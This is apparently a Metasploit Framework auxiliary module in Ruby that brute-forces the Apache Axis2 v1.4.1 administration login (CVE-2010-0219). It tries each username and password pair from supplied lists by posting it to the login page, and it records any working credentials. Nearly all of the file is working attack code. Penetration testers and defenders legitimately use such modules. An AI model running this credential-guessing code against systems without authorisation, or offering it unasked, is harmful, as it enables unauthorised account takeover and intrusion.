##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner


	def initialize
		super(
			'Name'           => 'Apache Axis2 v1.4.1 Brute Force Utility',
			'Description'    => %q{This module attempts to login to an Apache Axis2 v1.4.1
				instance using username and password combindations indicated by the USER_FILE,
				PASS_FILE, and USERPASS_FILE options.
			},
			'Author'         =>
				[
					'==[ Alligator Security Team ]==',
					'Leandro Oliveira <leandrofernando[at]gmail.com>'
				],
			'References'     =>
				[
					[ 'CVE', '2010-0219' ],
					[ 'OSVDB', '68662'],
				],
			'License'        => MSF_LICENSE
		)

		register_options(
			[ Opt::RPORT(8080),
				OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
		], self.class)
	end

	def target_url
		"http://#{vhost}:#{rport}#{datastore['URI']}"
	end

	def run_host(ip)

		print_status("Verifying login exists at #{target_url}")
		begin
			res = send_request_cgi({
					'method'  => 'GET',
					'uri'     => datastore['URI']
				}, 20)
		rescue
			print_error("The Axis2 login page does not exist at #{target_url}")
			return
		end

		print_status "#{target_url} - Apache Axis - Attempting authentication"

		each_user_pass { |user, pass|
			do_login(user, pass)
		}

	end

	def do_login(user=nil,pass=nil)
		post_data = "userName=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&submit=+Login+"
		vprint_status("#{target_url} - Apache Axis - Trying username:'#{user}' with password:'#{pass}'")

		begin
			res = send_request_cgi({
				'method'  => 'POST',
				'uri'     => datastore['URI'],
				'data'    => post_data,
			}, 20)

			if (res and res.code == 200 and res.body.to_s.match(/upload/) != nil)
				print_good("#{target_url} - Apache Axis - SUCCESSFUL login for '#{user}' : '#{pass}'")
				report_auth_info(
					:host   => rhost,
					:port   => rport,
					:sname => (ssl ? 'https' : 'http'),
					:user   => user,
					:pass   => pass,
					:proof  => "WEBAPP=\"Apache Axis\", VHOST=#{vhost}",
					:source_type => "user_supplied",
					:duplicate_ok => true,
					:active => true
				)

			elsif(res and res.code == 200)
				vprint_error("#{target_url} - Apache Axis - Failed to login as '#{user}'")
			else
				vprint_error("#{target_url} - Apache Axis - Unable to authenticate.")
				return :abort
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
